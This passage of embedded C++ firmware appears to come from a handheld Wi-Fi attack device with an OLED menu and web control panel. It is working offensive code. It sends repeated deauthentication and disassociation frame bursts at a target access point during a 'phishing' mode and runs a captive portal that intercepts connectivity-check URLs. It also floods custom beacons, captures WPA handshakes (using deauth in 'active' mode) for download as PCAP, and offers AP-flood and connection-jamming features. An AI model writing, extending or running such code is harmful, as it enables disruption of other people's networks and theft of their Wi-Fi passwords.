    if (webtest_ui_page == 0) {
      webtest_ui_page = 2; // 主页面按OK进入密码列表
    } else if (webtest_ui_page == 2) {
      // 在密码列表页按OK返回
      webtest_ui_page = 0;
    }
    lastOkTime = currentTime;
  }

  // 钓鱼期间：使用稳定自动多重攻击逻辑进行解除认证攻击
  // 采用微秒级帧间隔和循环原因码序列，提高攻击效率和稳定性
  if (phishingHasTarget) {
    unsigned long now = millis();
    if (now - lastPhishingDeauthMs >= 500UL) {
      int packetCount = 0;
      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
      lastPhishingDeauthMs = now;
    }
    if (now - lastPhishingBroadcastMs >= 1000UL) {
      // 广播去认证与解除关联（轻量），与handshake.h逻辑保持一致
      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
      wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
      lastPhishingBroadcastMs = now;
    }
  }

  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;
    WiFiClient client = web_server.available();
    if (client) {
      handleWebTestClient(client);
    }
  }

}

// 显示Web UI状态
void displayWebUIStatus() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  {
    const char* t = "192.168.1.1";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(t);
    int x = (display.width() - w) / 2; if (x < 0) x = 0;
    u8g2_for_adafruit_gfx.setCursor(x, 10);
    u8g2_for_adafruit_gfx.print(t);
  }
  // 第二行：SSID，超长滚动，否则居中
  {
    String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
    int textW = u8g2_for_adafruit_gfx.getUTF8Width(ssidLine.c_str());
    const int y = 25;
    static int ssidScrollX = 0;
    static unsigned long ssidLastScrollMs = 0;
    const int scrollDelay = 150; // ms
    if (textW <= display.width() - 2) {
      int x = (display.width() - textW) / 2; if (x < 0) x = 0;
      u8g2_for_adafruit_gfx.setCursor(x, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
      ssidScrollX = 0;
    } else {
      if (millis() - ssidLastScrollMs > (unsigned)scrollDelay) {
        ssidScrollX = (ssidScrollX + 2) % (textW + 16);
        ssidLastScrollMs = millis();
      }
      int startX = ssidScrollX;
      u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
      u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
    }
  }
  // 第三行：密码，超长滚动，否则居中
  {
    String pwdLine = String("密码: ") + String(WEB_UI_PASSWORD);
    int textW = u8g2_for_adafruit_gfx.getUTF8Width(pwdLine.c_str());
    const int y = 40;
    static int pwdScrollX = 0;
    static unsigned long pwdLastScrollMs = 0;
    const int scrollDelay = 150; // ms
    if (textW <= display.width() - 2) {
      int x = (display.width() - textW) / 2; if (x < 0) x = 0;
      u8g2_for_adafruit_gfx.setCursor(x, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
      pwdScrollX = 0;
    } else {
      if (millis() - pwdLastScrollMs > (unsigned)scrollDelay) {
        pwdScrollX = (pwdScrollX + 2) % (textW + 16);
        pwdLastScrollMs = millis();
      }
      int startX = pwdScrollX;
      u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
      u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
    }
  }
  {
    const char* b = "按下BACK退出";
    int wb = u8g2_for_adafruit_gfx.getUTF8Width(b);
    int xb = (display.width() - wb) / 2; if (xb < 0) xb = 0;
    u8g2_for_adafruit_gfx.setCursor(xb, 55);
    u8g2_for_adafruit_gfx.print(b);
  }
  
  display.display();
}
// 处理Web客户端请求
void handleWebClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 3000; // 3秒超时
  
  // 读取HTTP请求头
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) {
        break;
      }
    }
    delay(1);
  }
  
  // 解析请求方法和路径
  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }
  
  // 如果是POST请求，读取请求体
  if (method == "POST") {
    // 查找Content-Length头
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();
        
        // 读取请求体
        if (contentLength > 0) {
          String body = "";
          unsigned long bodyTimeout = millis() + 2000; // 2秒超时读取请求体
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }
          
          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }
          
          // 将请求体添加到完整请求中
          request += body;
        }
      }
    }
  }
  
  // Captive Portal: 常见探测端点，统一返回204或重定向
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  // 处理不同的请求路径（精简为自定义信标功能）
  else if (path == "/" || path == "/index.html") {
    sendWebPage(client);
  } else if (method == "POST" && path == "/custom-beacon") {
    // 解析POST体中的ssid与band（支持x-www-form-urlencoded或JSON的简单匹配）
    String body = "";
    int bodyStartPos = request.indexOf("\r\n\r\n");
    if (bodyStartPos >= 0) {
      body = request.substring(bodyStartPos + 4);
    }

    // 提取ssid
    String ssid = "";
    // urlencoded: ssid=...
    int ssidPos = body.indexOf("ssid=");
    if (ssidPos >= 0) {
      int end = body.indexOf('&', ssidPos);
      if (end < 0) end = body.length();
      ssid = urlDecode(body.substring(ssidPos + 5, end));
    }
    // JSON: "ssid":"..."
    if (ssid.length() == 0) {
      int j1 = body.indexOf("\"ssid\":\"");
      if (j1 >= 0) {
        int j2 = body.indexOf('"', j1 + 8);
        if (j2 > j1) ssid = body.substring(j1 + 8, j2);
      }
    }

    // 提取band
    String band = "mixed";
    int bandPos = body.indexOf("band=");
    if (bandPos >= 0) {
      int end = body.indexOf('&', bandPos);
      if (end < 0) end = body.length();
      band = urlDecode(body.substring(bandPos + 5, end));
    }
    if (band.length() == 0) {
      int k1 = body.indexOf("\"band\":\"");
      if (k1 >= 0) {
        int k2 = body.indexOf('"', k1 + 9);
        if (k2 > k1) band = body.substring(k1 + 9, k2);
      }
    }

    // 进一步宽松处理：容错常见未规范替换
    ssid.replace("%20", " ");

    // 设置频段模式：0=综合,1=5G,2=2.4G
    if (band == "mixed") {
      beaconBandMode = 0;
    } else if (band == "5g" || band == "5G") {
      beaconBandMode = 1;
    } else {
      beaconBandMode = 2;
    }

    // 启动自定义信标攻击
    if (ssid.length() > 0) {
      startCustomBeaconFromWeb(ssid);
      String resp = "{\"success\":true,\"message\":\"custom beacon started\"}";
      String hdr = "HTTP/1.1 200 OK\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    } else {
      String resp = "{\"success\":false,\"message\":\"ssid required\"}";
      String hdr = "HTTP/1.1 400 Bad Request\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    }
  } else if (path == "/status") {
    handleStatusRequest(client);
  } else if (method == "POST" && path == "/stop") {
    // minimal stop for custom beacon
    beaconAttackRunning = false;
    becaonstate = 0;
    stopAttackLED();
    String resp = "{\"success\":true,\"message\":\"stopped\"}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(resp.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(resp);
  } else if (method == "POST" && path == "/handshake/scan") {
    // Graceful scan: stop AP services, perform scan, restart AP, results kept
    // 防抖：仅当未在扫描中时才进行
    if (!g_scanDone) {
      // Stop WebUI AP (clients will disconnect briefly)
      stopDNSServer();
      stopWebServer();
      wifi_off();
      delay(200);
      wifi_on(RTW_MODE_STA);
      delay(200);
    }
    // Start scan async in the background state variables
    scan_results.clear();
    g_scanDone = false;
    unsigned long startMs __attribute__((unused)) = millis();
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      // Let loop-side status endpoint report progress
    }
    // Stash a marker that a scan is in progress
    hs_sniffer_running = false; // not used; reuse web_ui_active flag
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/scan-status") {
    bool done = g_scanDone;
    String json = String("{\"done\":") + (done?"true":"false") + "}";
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + String(json.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
  } else if (path == "/handshake/scan-results") {
    // Restart AP and return results as HTML
    // Restart original AP
    wifi_off();
    delay(200);
    wifi_on(RTW_MODE_AP);
    delay(300);
    {
      char channel_str[4];
      sprintf(channel_str, "%d", WEB_UI_CHANNEL);
      if (!WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
        // fallback attempt without password semantics
        WiFi.apbegin((char*)WEB_UI_SSID, (char*)WEB_UI_PASSWORD, channel_str, 0);
      }
    }
    // 等待IP获取稳定
    IPAddress apIp;
    unsigned long t0 = millis();
    do { apIp = WiFi.localIP(); delay(50); } while (apIp[0]==0 && millis()-t0<2000);
    startWebUIServices(apIp);
    String html;
    html.reserve(1024);
    html += "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>信号</th><th>选择</th></tr>";
    for (size_t i=0;i<scan_results.size() && i<64;i++){
      const WiFiScanResult &r = scan_results[i];
      html += "<tr><td>" + (r.ssid.length()? r.ssid: String("<隐藏>")) + "</td><td>" + r.bssid_str + "</td><td>" + String(r.channel) + "</td><td>" + String(r.rssi) + "</td><td>";
      html += "<button onclick=\"selectNetwork('" + r.bssid_str + "')\">选择</button>";
      html += "</td></tr>";
    }
    html += "</table>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html; charset=UTF-8\r\n";
    hdr += "Content-Length: " + String(html.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (method == "POST" && path.startsWith("/handshake/select")) {
    // parse bssid from query or body
    String bssidStr = "";
    int qpos = path.indexOf('?');
    if (qpos >= 0 && qpos + 1 < (int)path.length()) {
      String qs = path.substring(qpos + 1);
      int p = qs.indexOf("bssid=");
      if (p >= 0) { bssidStr = qs.substring(p + 6); }
    }
    if (bssidStr.length() == 0) {
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int k = body.indexOf("bssid=");
        if (k >= 0) { bssidStr = urlDecode(body.substring(k + 6)); }
      }
    }
    hs_has_selection = false;
    if (bssidStr.length() > 0) {
      for (size_t i=0;i<scan_results.size();i++){
        if (scan_results[i].bssid_str == bssidStr) {
          hs_selected_network = scan_results[i];
          hs_has_selection = true;
          break;
        }
      }
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/capture") {
    // Map selection to handshake globals and start
    if (hs_has_selection) {
      // Parse mode from body (active|passive|efficient)
      String mode = "active";
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int m = body.indexOf("mode=");
        if (m >= 0) {
          int amp = body.indexOf('&', m);
          mode = urlDecode(body.substring(m + 5, amp >= 0 ? amp : body.length()));
        }
      }
      // Populate globals expected by handshake.h
      memcpy(_selectedNetwork.bssid, hs_selected_network.bssid, 6);
      _selectedNetwork.ssid = hs_selected_network.ssid;
      _selectedNetwork.ch = hs_selected_network.channel;
      AP_Channel = String(current_channel);
      // Configure capture mode
      if (mode == "passive") {
        g_captureMode = CAPTURE_MODE_PASSIVE;
        g_captureDeauthEnabled = false;
      } else if (mode == "efficient") {
        g_captureMode = CAPTURE_MODE_EFFICIENT;
        g_captureDeauthEnabled = false; // 不在嗅探窗口发送
      } else {
        g_captureMode = CAPTURE_MODE_ACTIVE;
        g_captureDeauthEnabled = true;
      }
      Serial.print("[WebUI] Capture mode: "); Serial.println(mode);
      isHandshakeCaptured = false;
      handshakeDataAvailable = false;
      readyToSniff = true;
      hs_sniffer_running = true;
      // 启动抓包LED控制
      startHandshakeLED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/stop") {
    readyToSniff = false;
    hs_sniffer_running = false;
    // 恢复WebUI LED状态
    if (web_ui_active) {
      startWebUILED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/status") {
    size_t savedSize = (size_t)globalPcapData.size();
    bool captured = handshakeDataAvailable || (savedSize > 0) || isHandshakeCaptured;
    String json = "{";
    json += "\"running\":" + String(hs_sniffer_running ? "true":"false") + ",";
    json += "\"captured\":" + String(captured ? "true":"false") + ",";
    json += "\"justCaptured\":" + String(handshakeJustCaptured ? "true":"false") + ",";
    json += "\"hsCount\":" + String((unsigned long)lastCaptureHSCount) + ",";
    json += "\"mgmtCount\":" + String((unsigned long)lastCaptureMgmtCount) + ",";
    json += "\"ts\":" + String((unsigned long)lastCaptureTimestamp) + 
            ",\"pcapSize\":" + String((unsigned long)savedSize) + "}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(json.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
    // 消费一次 justCaptured 标志，保证只弹一次
    if (handshakeJustCaptured) handshakeJustCaptured = false;
  } else if (method == "POST" && path == "/handshake/delete") {
    resetGlobalHandshakeData();
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/options") {
    // Return <option> list for dropdown
    String html;
    html.reserve(2048);
    for (size_t i=0;i<scan_results.size() && i<128;i++) {
      const WiFiScanResult &r = scan_results[i];
      String label = (r.ssid.length()? r.ssid: String("<隐藏>"));
      label += String(" | ") + r.bssid_str + String(" | CH") + String(r.channel) + String(" | RSSI ") + String(r.rssi);
      html += String("<option value=\"") + r.bssid_str + String("\">") + label + String("</option>");
    }
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: " + String(html.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (path == "/handshake/download") {
    // Return PCAP data
    const std::vector<uint8_t> &buf = (globalPcapData.size() > 0) ? globalPcapData : globalPcapData;
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/octet-stream\r\n";
    hdr += "Content-Disposition: attachment; filename=\"capture.pcap\"\r\n";
    hdr += "Content-Length: " + String((unsigned long)buf.size()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    if (!buf.empty()) { client.write(buf.data(), buf.size()); }
  } else {
    // 其他路径：重定向到根以触发门户
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }
  
  client.stop();
}

// 发送Web页面
void sendWebPage(WiFiClient& client) {
  size_t pageLen = strlen_P(WEB_ADMIN_HTML);
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Cache-Control: public, max-age=300\r\n";
  header += "Content-Length: " + String(pageLen) + "\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // WebUI功能展示管理页面
  client.print(F(WEB_ADMIN_HTML));
}

// 处理状态请求
void handleStatusRequest(WiFiClient& client) {
  String json = "{";
  bool apRunning = web_ui_active || web_test_active;
  json += "\"ap_running\":" + String(apRunning ? "true" : "false") + ",";
  json += "\"connected_clients\":" + String(web_client.connected() ? 1 : 0) + ",";
  json += "\"ssid\":\"" + String(web_test_active ? web_test_ssid_dynamic : WEB_UI_SSID) + "\",";
  json += "\"deauth_running\":" + String(deauthAttackRunning ? "true" : "false") + ",";
  json += "\"beacon_running\":" + String(beaconAttackRunning ? "true" : "false");
  json += "}";
  
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: application/json\r\n";
  header += "Content-Length: " + String(json.length()) + "\r\n";
  header += "Connection: close\r\n\r\n";
  
  client.print(header);
  client.print(json);
}

// 发送404响应
/* removed: legacy WebUI 404 */
void send404Response(WiFiClient& client) {
  String header = "HTTP/1.1 404 Not Found\r\n";
  header += "Content-Type: text/plain\r\n";
  header += "Connection: close\r\n\r\n";
  
  client.print(header);
  client.print("404 Not Found");
}

// ============ Web UI 攻击执行函数 ============
// 这些函数实现非阻塞的攻击逻辑，复用OLED菜单中的攻击代码

// 自定义信标参数（Web UI）
static String g_customBeaconSSID;
static bool g_customBeaconStable = false; // 复用稳定/暴力参数设计

void startCustomBeaconFromWeb(const String& ssid) {
  beaconAttackRunning = true;
  g_customBeaconSSID = ssid;
  // 使用暴力模式参数
  g_customBeaconStable = false;
  // 设置信标攻击状态代码为4
  becaonstate = 4;
  startAttackLED();
  Serial.println("=== Web UI: 开始自定义SSID信标攻击 ===");
  Serial.println("SSID: " + g_customBeaconSSID);
}

void executeCustomBeaconFromWeb() {
  static unsigned long lastRun = 0;
  static unsigned long lastBlinkTime = 0;
  static bool redState = false;
  const unsigned long runInterval = 5; // 发送节奏
  const unsigned long blinkInterval = 600;

  unsigned long now = millis();
  if (now - lastBlinkTime >= blinkInterval) {
    redState = !redState;
    digitalWrite(LED_R, redState ? HIGH : LOW);
    lastBlinkTime = now;
  }

  if (!beaconAttackRunning) return;
  if (g_customBeaconSSID.length() == 0) return;

  if (now - lastRun < runInterval) return;
  lastRun = now;

  // mixed/5G/2.4G 由全局 beaconBandMode 控制，与 executeCrossBandBeaconAttackWeb 保持一致
  // 选择一个"原始信道"来驱动跨频段逻辑：若综合/2.4G则以6信道为原始；若5G则以36为原始
  int originalChannel = (beaconBandMode == 1) ? 36 : 6;
  executeCrossBandBeaconAttackWeb(g_customBeaconSSID, originalChannel, g_customBeaconStable);
}

// ============ LED控制函数 ============

// 更新LED状态
void updateLEDs() {
  unsigned long currentTime = millis();
  
  // 检查是否正在抓包，如果是则跳过LED控制
  extern bool hs_sniffer_running;
  if (hs_sniffer_running) {
    return; // 抓包期间不控制LED，由抓包函数控制
  }
  
  // 蓝灯：通电常亮
  digitalWrite(LED_B, HIGH);
  
  // 绿灯：WebUI运行时常亮
  if (web_ui_active) {
    digitalWrite(LED_G, HIGH);
  } else {
    digitalWrite(LED_G, LOW);
  }
  
  // 红灯：攻击时闪烁
  if (deauthAttackRunning || beaconAttackRunning) {
    if (currentTime - lastRedLEDBlink >= RED_LED_BLINK_INTERVAL) {
      redLEDState = !redLEDState;
      digitalWrite(LED_R, redLEDState ? HIGH : LOW);
      lastRedLEDBlink = currentTime;
    }
  } else {
    digitalWrite(LED_R, LOW);
  }
}

// 启动攻击LED指示
void startAttackLED() {
  Serial.println("开始攻击 - 红灯闪烁");
  digitalWrite(LED_R, HIGH);
  lastRedLEDBlink = millis();
}

// 停止攻击LED指示
void stopAttackLED() {
  Serial.println("停止攻击 - 红灯关闭");
  digitalWrite(LED_R, LOW);
}

// 启动WebUI LED指示
void startWebUILED() {
  Serial.println("启动WebUI - 绿灯常亮");
  digitalWrite(LED_G, HIGH);
}

// 关闭WebUI LED指示
void closeWebUILED() {
  Serial.println("关闭WebUI - 绿灯关闭");
  digitalWrite(LED_G, LOW);
}

// 启动抓包LED指示（熄灭所有LED）
void startHandshakeLED() {
  Serial.println("开始抓包 - LED熄灭");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  Serial.println("LED状态已设置为熄灭");
}

// 抓包完成LED指示（绿灯常亮）
void completeHandshakeLED() {
  Serial.println("抓包完成 - 绿灯常亮");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  digitalWrite(LED_B, LOW);
  Serial.println("LED状态已设置为绿灯常亮");
}
// ============ 通用攻击状态显示函数 ============

// 显示攻击状态页面，包含居中的"源攻击中"文字和闪烁的WiFi图标
void showAttackStatusPage(const char* attackType) {
  static unsigned long lastBlinkTime = 0;
  static bool wifiVisible = true;
  static int blinkCount = 0;
  static bool inBlinkCycle = false;
  const unsigned long BLINK_INTERVAL = 3000; // 3秒闪烁间隔
  const unsigned long BLINK_DURATION = 150; // 每次闪烁持续150ms
  
  unsigned long currentTime = millis();
  
  // 控制WiFi图标每3秒闪烁两下
  if (!inBlinkCycle && (currentTime - lastBlinkTime >= BLINK_INTERVAL)) {
    // 开始新的闪烁周期
    inBlinkCycle = true;
    blinkCount = 0;
    wifiVisible = false; // 开始闪烁，先隐藏
    lastBlinkTime = currentTime;
  }
  
  if (inBlinkCycle) {
    // 在闪烁周期中，每150ms切换一次可见性
    if (currentTime - lastBlinkTime >= BLINK_DURATION) {
      wifiVisible = !wifiVisible;
      lastBlinkTime = currentTime;
      
      if (!wifiVisible) {
        blinkCount++;
        if (blinkCount >= 3) {
          // 完成三下闪烁，结束周期
          inBlinkCycle = false;
          wifiVisible = true; // 恢复常亮状态
          lastBlinkTime = currentTime; // 重置计时器等待下次周期
        }
      }
    }
  }
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  // 居中显示攻击类型文字
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 计算文字宽度并居中
  int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(attackType);
  int textX = (display.width() - textWidth) / 2;
  int textY = 25; // 垂直位置
  
  u8g2_for_adafruit_gfx.setCursor(textX, textY);
  u8g2_for_adafruit_gfx.print(attackType);
  
  // 在下方显示WiFi图标（居中）
  if (wifiVisible) {
    int wifiX = (display.width() - 19) / 2; // WiFi图标宽度19像素
    int wifiY = 42; // 图标垂直位置
    display.drawBitmap(wifiX, wifiY, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
  }
  
  display.display();
}

// ============ AP洪水攻击说明页面 ============

// 显示AP洪水攻击功能说明页面
bool showApFloodInfoPage() {
  // 添加去抖变量
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // 处理返回键
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 等待按键释放
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 额外消抖时间
      return false; // 返回首页
    }

    // 处理确认键
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 等待按键释放
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 额外消抖时间
      return true; // 继续执行AP洪水攻击
    }

    // 绘制说明页面
    display.clearDisplay();
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

    // 三行说明文字（居中）
    const char* line1 = "针对轻量家用路由以及";
    const char* line2 = "随身wifi等设备效果显著";
    const char* line3 = "通常对手机热点无效";

    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);

    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;

    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);

    // 操作按钮
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 返回");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("继续 》");

    display.display();

    delay(10); // 短暂延时避免CPU占用过高
  }
}

// ============ 连接干扰说明页面 ============

// 显示连接干扰功能说明页面
bool showLinkJammerInfoPage() {
  // 添加去抖变量
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    
    // 处理返回键
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 等待按键释放
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 额外消抖时间
      return false; // 返回首页
    }
    
    // 处理确认键
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 等待按键释放
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 额外消抖时间
      return true; // 继续执行连接干扰
    }
    
    // 绘制说明页面
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // 前三行显示说明文字（居中）
    const char* line1 = "干扰新连接，无法断网";
    const char* line2 = "无视WPA/2/3等协议";
    const char* line3 = "效果因目标设备而异";
    
    // 计算每行文字宽度并居中
    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
    
    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;
    
    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);
    
    // 第四行显示操作按钮
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 返回");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("继续 》");
    
    display.display();
    
    delay(10); // 短暂延时避免CPU占用过高
  }
}

// ============ 统一菜单动作函数实现 ============
// 所有首页菜单项的动作函数在此实现

void homeActionSelectSSID() {
  drawssid();
}

void homeActionAttackMenu() {
  drawattack();
}

void homeActionQuickScan() {
  // 稳定按键状态，为确认弹窗做准备
  stabilizeButtonState();
  if (showConfirmModal("快速扫描AP/SSID")) {
    checkBleResourcesForWiFi(); // 检查并清理BLE资源
    drawscan();
  }
}

void homeActionPhishing() {
  if (SelectedVector.empty()) {
    showModalMessage("请先选择AP/SSID");
  } else {
    // 移除钓鱼功能的一次性状态限制，允许重复启动
    // 原来的锁定检查已注释掉：
    // } else if (g_webTestLocked || g_webUILocked) {
    //   display.clearDisplay();
    //   u8g2_for_adafruit_gfx.setFontMode(1);
    //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    //   u8g2_for_adafruit_gfx.setCursor(5, 20);
    //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
    //   u8g2_for_adafruit_gfx.setCursor(5, 40);
    //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
    //   u8g2_for_adafruit_gfx.setCursor(5, 60);
    //   u8g2_for_adafruit_gfx.print("《 返回主菜单");
    //   display.display();
    //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
    //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
    // } else {
    if (apWebPageSelectionMenu()) {
      // 稳定按键状态，为确认弹窗做准备
      stabilizeButtonState();
      
      bool confirmed = showConfirmModal("启动钓鱼模式");
      if (confirmed) {
        display.clearDisplay();
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        const char* msg = "正在启动...";
        int w = u8g2_for_adafruit_gfx.getUTF8Width(msg);
        int x = (display.width() - w) / 2;
        u8g2_for_adafruit_gfx.setCursor(x, 32);
        u8g2_for_adafruit_gfx.print(msg);
        display.display();
